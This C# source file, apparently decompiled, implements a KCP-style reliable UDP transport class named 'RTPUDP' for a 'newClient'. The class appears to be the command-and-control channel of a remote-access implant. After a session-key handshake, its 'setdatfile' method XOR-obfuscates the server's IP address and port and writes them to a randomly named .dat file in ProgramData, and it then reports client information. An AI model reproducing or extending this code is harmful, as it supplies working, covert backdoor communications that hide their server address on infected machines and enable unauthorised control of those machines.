using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Models;
using algorithm;

namespace newClient.Comms.UDP;

public class RTPUDP : ISocketModule
{
	private readonly object sndSync = new object();

	private readonly DateTime refTime = DateTime.Now;

	private UdpClient client;

	private bool Running = true;

	private bool CompleteQueueStatus;

	public readonly Channel<byte[]> rcvProducerChannel;

	private readonly SortedList<uint, udpSegment> rcvSortedLists;

	private readonly Channel<udpSegment> rcvChannel;

	private readonly List<udpSegment> sndLists;

	private readonly Channel<udpSegment> sndChannel;

	private ulong LastTime;

	private bool _disposed;

	private uint conv = GetSessionConv();

	private uint mss = 1300u;

	private uint snd_una = 1u;

	private uint snd_nxt = 1u;

	private uint snd_wnd = 256u;

	private uint rcv_nxt = 1u;

	private uint rcv_wnd = 256u;

	private uint rmt_wnd = 1u;

	private uint cwnd = 1u;

	private uint probe;

	private uint ssthresh = 8u;

	private uint rx_srtt;

	private uint rx_minrto = 100u;

	private uint rx_rto = 200u;

	private uint rx_rttval;

	private uint probe_wait;

	private uint ts_probe;

	private bool isresend;

	public RTPUDPType RTPUDPStatus = RTPUDPType.DISCONNECT;

	private const int ASK_SEND = 1;

	private const int ASK_TELL = 2;

	private const int RTO_MAX = 60000;

	private const int PROBE_INIT = 7000;

	private const int PROBE_LIMIT = 120000;

	private const int interval = 10;

	private const uint timeInterval = 5000u;

	private const uint MaxTimeOutCount = 3u;

	private uint timeoutIndex;

	private ulong timeoutTs;

	public AesManaged aesManaged { get; set; }

	public bool Connected
	{
		get
		{
			return RTPUDPStatus == RTPUDPType.CONNECT;
		}
		set
		{
		}
	}

	public ProType ProtocolType
	{
		get
		{
			return ProType.UDP;
		}
		set
		{
		}
	}

	public Channel<byte[]> ConsumerChannel { get; set; }

	public RTPUDP()
	{
		rcvProducerChannel = new Channel<byte[]>();
		rcvSortedLists = new SortedList<uint, udpSegment>();
		rcvChannel = new Channel<udpSegment>();
		sndLists = new List<udpSegment>();
		sndChannel = new Channel<udpSegment>((int)snd_wnd);
		ConsumerChannel = new Channel<byte[]>();
		aesManaged = new AesManaged(config.SessionKey.Replace("@", ""));
	}

	public bool socketConnect(string host, int port)
	{
		client = new UdpClient(host, port);
		ThreadPool.QueueUserWorkItem(ReceiveProcessor);
		ThreadPool.QueueUserWorkItem(Update);
		for (int i = 1; i <= 1; i++)
		{
			if (RTPUDPStatus == RTPUDPType.CONNECT)
			{
				break;
			}
			byte[] array = udpSegment.udpSegmentToBytes(new udpSegment
			{
				conv = conv,
				sn = 0u,
				wnd = rcv_wnd,
				una = 0u,
				cmd = 21,
				data = Encoding.UTF8.GetBytes(config.SessionKey),
				length = (uint)config.SessionKey.Length
			});
			client.Send(array, array.Length);
			Thread.Sleep(10000);
		}
		if (RTPUDPStatus == RTPUDPType.DISCONNECT)
		{
			Running = false;
		}
		return RTPUDPStatus == RTPUDPType.CONNECT;
	}

	public int socketSend(byte[] data)
	{
		if (RTPUDPStatus != RTPUDPType.CONNECT)
		{
			return -1;
		}
		int num = (int)(data.Length + mss - 1) / (int)mss - 1;
		lock (sndSync)
		{
			using MemoryStream input = new MemoryStream(data);
			using BinaryReader binaryReader = new BinaryReader(input);
			while (RTPUDPStatus == RTPUDPType.CONNECT)
			{
				byte[] array = binaryReader.ReadBytes((int)mss);
				while (!sndChannel.TryEnqueue(new udpSegment
				{
					conv = conv,
					frg = (uint)num,
					length = (uint)array.Length,
					cmd = 17,
					xmit = 0,
					fastack = 0,
					data = array
				}) && RTPUDPStatus == RTPUDPType.CONNECT)
				{
				}
				if (num == 0)
				{
					break;
				}
				num--;
			}
		}
		if (num != 0)
		{
			return -1;
		}
		return 0;
	}

	public void socketclose()
	{
		RTPUDPClose();
	}

	private void ReceiveProcessor(object state)
	{
		IPEndPoint remoteEP = null;
		while (Running)
		{
			try
			{
				byte[] array = client.Receive(ref remoteEP);
				if (array != null && array.Length >= udpSegment.Segment_OVERHEAD)
				{
					rcvProducerChannel.TryEnqueue(array);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private void Update(object state)
	{
		try
		{
			while (Running)
			{
				Input();
				Flush();
				Thread.Sleep(10);
			}
		}
		catch (Exception)
		{
			RTPUDPClose();
		}
	}

	private void CompleteQueueProcessor(object state)
	{
		while (RTPUDPStatus == RTPUDPType.CONNECT)
		{
			try
			{
				if (rcvChannel.TryPeek(out var item))
				{
					uint num = item.frg + 1;
					if (rcvChannel.Count >= num)
					{
						using MemoryStream memoryStream = new MemoryStream();
						udpSegment item2;
						while (rcvChannel.TryDequeue(out item2))
						{
							memoryStream.Write(item2.data, 0, item2.data.Length);
							if (item2.frg == 0)
							{
								memoryStream.Flush();
								ConsumerChannel.TryEnqueue(memoryStream.ToArray());
								break;
							}
							item2 = null;
						}
						memoryStream.Close();
					}
					item = null;
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(1);
		}
	}

	public void setdatfile()
	{
		byte[] bytes = BitConverter.GetBytes((ushort)new Random().Next(1, 65535));
		byte[] bytes2 = BitConverter.GetBytes((ushort)1);
		using MemoryStream memoryStream = new MemoryStream();
		using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write(bytes);
		binaryWriter.Write(bytes2);
		byte[] bytes3 = Encoding.Unicode.GetBytes(((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString());
		byte[] array = new byte[32];
		Array.Copy(bytes3, array, bytes3.Length);
		binaryWriter.Write(array);
		binaryWriter.Write((ushort)((IPEndPoint)client.Client.RemoteEndPoint).Port);
		byte[] array2 = memoryStream.ToArray();
		for (int i = 0; i < array2.Length - 2; i++)
		{
			array2[i + 2] ^= bytes[i % 2];
		}
		try
		{
			File.WriteAllBytes(Environment.GetEnvironmentVariable("systemdrive") + "\\programdata\\sJuDr005Km.dat", array2);
		}
		catch
		{
		}
	}

	private void Input()
	{
		uint num = 0u;
		uint num2 = currentMS();
		bool isrcv = false;
		for (int i = 0; i < 50; i++)
		{
			if (rcvProducerChannel.Count <= 0)
			{
				break;
			}
			if (!rcvProducerChannel.TryDequeue(out var item))
			{
				break;
			}
			udpSegment udpSegment2 = udpSegment.BytesToSegment(item);
			timeoutTs = num2 + 10000;
			timeoutIndex = 0u;
			isrcv = true;
			if (udpSegment2 == null || udpSegment2.conv != conv)
			{
				return;
			}
			num = ((num > snd_una) ? num : snd_una);
			unaProcessor(udpSegment2.una);
			if (LastTime < udpSegment2.ts)
			{
				rmt_wnd = udpSegment2.wnd;
				LastTime = udpSegment2.ts;
			}
			switch (udpSegment2.cmd)
			{
			case 16:
				if (_itimediff(num2, udpSegment2.ts) >= 0)
				{
					UpdateAck(_itimediff(num2, udpSegment2.ts));
				}
				fastackProcessor(udpSegment2.sn);
				break;
			case 17:
				if (_itimediff(udpSegment2.sn, rcv_nxt) >= 0)
				{
					PushProcessor(udpSegment2);
				}
				if (_itimediff(udpSegment2.sn, rcv_nxt + rcv_wnd) < 0)
				{
					AckProcessor(udpSegment2.sn, num2, RTPUDPType.ACK);
				}
				break;
			case 18:
				probe |= 2u;
				break;
			case 21:
				RTPUDPStatus = RTPUDPType.CONNECT;
				if (!CompleteQueueStatus)
				{
					ThreadPool.QueueUserWorkItem(CompleteQueueProcessor);
				}
				setdatfile();
				SocketManger.clientinfoProcessor();
				CompleteQueueStatus = true;
				return;
			}
			udpSegment2 = null;
			item = null;
		}
		if (_itimediff(snd_una, num) > 0 && num != 0)
		{
			if (isresend)
			{
				cwnd /= 2u;
				if (cwnd == 0)
				{
					cwnd = 1u;
				}
			}
			else if (cwnd < rmt_wnd)
			{
				if (cwnd < ssthresh)
				{
					cwnd *= 2u;
				}
				else
				{
					cwnd++;
				}
			}
			else
			{
				cwnd = rmt_wnd;
			}
		}
		TimeOutProcessor(num2, isrcv);
	}

	private void TimeOutProcessor(uint current, bool isrcv)
	{
		if (RTPUDPStatus != RTPUDPType.CONNECT)
		{
			return;
		}
		if (timeoutIndex > 2)
		{
			throw new Exception();
		}
		if (timeoutTs < current)
		{
			timeoutIndex++;
			timeoutTs = current + 10000;
			if (!isrcv && sndChannel.Count == 0 && sndLists.Count == 0)
			{
				udpSegmentSend(udpSegment.udpSegmentToBytes(new udpSegment
				{
					conv = conv,
					cmd = 23,
					wnd = wnd_unused(),
					una = rcv_nxt,
					ts = currentMS()
				}));
			}
		}
	}

	private void Flush()
	{
		uint num = currentMS();
		if (rmt_wnd == 0)
		{
			if (probe_wait == 0)
			{
				probe_wait = 7000u;
				ts_probe = num + probe_wait;
			}
			else if (_itimediff(num, ts_probe) >= 0)
			{
				if (probe_wait < 7000)
				{
					probe_wait = 7000u;
				}
				probe_wait += probe_wait / 2u;
				if (probe_wait > 120000)
				{
					probe_wait = 120000u;
				}
				ts_probe = num + probe_wait;
				probe |= 1u;
			}
		}
		else
		{
			ts_probe = 0u;
			probe_wait = 0u;
		}
		if ((probe & (true ? 1u : 0u)) != 0)
		{
			udpSegment udpSegment2 = new udpSegment();
			udpSegment2.conv = conv;
			udpSegment2.wnd = wnd_unused();
			udpSegment2.una = rcv_nxt;
			udpSegment2.cmd = 18;
			udpSegmentSend(udpSegment.udpSegmentToBytes(udpSegment2));
			udpSegment2 = null;
		}
		if ((probe & 2u) != 0)
		{
			udpSegment udpSegment3 = new udpSegment();
			udpSegment3.conv = conv;
			udpSegment3.wnd = wnd_unused();
			udpSegment3.una = rcv_nxt;
			udpSegment3.cmd = 20;
			udpSegmentSend(udpSegment.udpSegmentToBytes(udpSegment3));
			udpSegment3 = null;
		}
		probe = 0u;
		uint num2 = _imin_(cwnd, rmt_wnd);
		uint wnd = wnd_unused();
		int num3 = 0;
		udpSegment item;
		while (_itimediff(snd_nxt, snd_una + num2) < 0 && sndLists.Count < snd_wnd && sndChannel.Count > 0 && sndChannel.TryDequeue(out item))
		{
			item.sn = snd_nxt++;
			sndLists.Add(item);
			num3++;
			item = null;
		}
		if (num3 == 0)
		{
			num3 = 1;
		}
		isresend = false;
		foreach (udpSegment sndList in sndLists)
		{
			if (sndList.xmit == 0 || _itimediff(num, sndList.resendts) >= 0)
			{
				if (sndList.xmit != 0 && _itimediff(num, sndList.resendts) >= 0)
				{
					isresend = true;
				}
				sndList.wnd = wnd;
				sndList.ts = num;
				sndList.una = rcv_nxt;
				sndList.xmit++;
				sndList.rto = rx_rto;
				sndList.resendts = num + sndList.rto;
				udpSegmentSend(udpSegment.udpSegmentToBytes(sndList));
				num3--;
			}
			if (num3 == 0)
			{
				break;
			}
		}
	}

	private void PushProcessor(udpSegment segment)
	{
		if (!rcvSortedLists.ContainsKey(segment.sn))
		{
			rcvSortedLists.Add(segment.sn, segment);
			while (rcvSortedLists.ContainsKey(rcv_nxt))
			{
				rcvChannel.TryEnqueue(rcvSortedLists[rcv_nxt]);
				rcvSortedLists.Remove(rcv_nxt);
				rcv_nxt++;
			}
		}
	}

	private void unaProcessor(uint una)
	{
		int num = 0;
		foreach (udpSegment sndList in sndLists)
		{
			if (_itimediff(una, sndList.sn) > 0)
			{
				num++;
				continue;
			}
			break;
		}
		if (num > 0)
		{
			sndLists.RemoveRange(0, num);
		}
		snd_una = ((sndLists.Count > 0) ? sndLists[0].sn : snd_nxt);
	}

	private void fastackProcessor(uint sn)
	{
		if (_itimediff(sn, snd_una) < 0 || _itimediff(sn, snd_nxt) >= 0)
		{
			return;
		}
		foreach (udpSegment sndList in sndLists)
		{
			if (_itimediff(sndList.sn, snd_nxt) >= 0)
			{
				break;
			}
			if (sn != sndList.sn)
			{
				sndList.fastack++;
			}
			if (sndList.sn == sn)
			{
				sndLists.Remove(sndList);
				snd_una = ((sndLists.Count > 0) ? sndLists[0].sn : snd_nxt);
				break;
			}
		}
	}

	private void AckProcessor(uint sn, uint ts, RTPUDPType type)
	{
		udpSegmentSend(udpSegment.udpSegmentToBytes(new udpSegment
		{
			conv = conv,
			cmd = (byte)type,
			wnd = wnd_unused(),
			una = rcv_nxt,
			sn = sn,
			ts = ts
		}));
	}

	private void udpSegmentSend(byte[] bytes)
	{
		if (RTPUDPStatus == RTPUDPType.CONNECT)
		{
			client.Send(bytes, bytes.Length);
		}
	}

	private void UpdateAck(int rtt)
	{
		if (rx_srtt == 0)
		{
			rx_srtt = (uint)rtt;
			rx_rttval = (uint)rtt / 2u;
		}
		else
		{
			int num = rtt - (int)rx_srtt;
			if (num < 0)
			{
				num = -num;
			}
			rx_rttval = (uint)((int)(3 * rx_rttval) + num) / 4u;
			rx_srtt = (uint)((7 * rx_srtt + rtt) / 8);
			if (rx_srtt < 1)
			{
				rx_srtt = 1u;
			}
		}
		uint middle = rx_srtt + _imax_(10u, 4 * rx_rttval);
		rx_rto = _ibound_(rx_minrto, middle, 60000u);
	}

	private uint wnd_unused()
	{
		if (rcvProducerChannel.Count >= rcv_wnd)
		{
			return 0u;
		}
		return (uint)(rcv_wnd - rcvProducerChannel.Count);
	}

	private uint _ibound_(uint lower, uint middle, uint upper)
	{
		return _imin_(_imax_(lower, middle), upper);
	}

	private uint _imin_(uint a, uint b)
	{
		if (a > b)
		{
			return b;
		}
		return a;
	}

	private uint _imax_(uint a, uint b)
	{
		if (a < b)
		{
			return b;
		}
		return a;
	}

	private int _itimediff(uint later, uint earlier)
	{
		return (int)(later - earlier);
	}

	private uint currentMS()
	{
		return (uint)DateTime.Now.Subtract(refTime).TotalMilliseconds;
	}

	private void RTPUDPClose()
	{
		RTPUDPStatus = RTPUDPType.DISCONNECT;
		Running = false;
		rcvProducerChannel.CompleteAdding();
		rcvSortedLists.Clear();
		rcvChannel.CompleteAdding();
		sndLists.Clear();
		sndChannel.CompleteAdding();
		client.Close();
		ConsumerChannel.CompleteAdding();
		GC.Collect();
	}

	private static uint GetSessionConv()
	{
		return (uint)new Random(BitConverter.ToInt32(Guid.NewGuid().ToByteArray(), 0)).Next(286331153, int.MaxValue);
	}
}
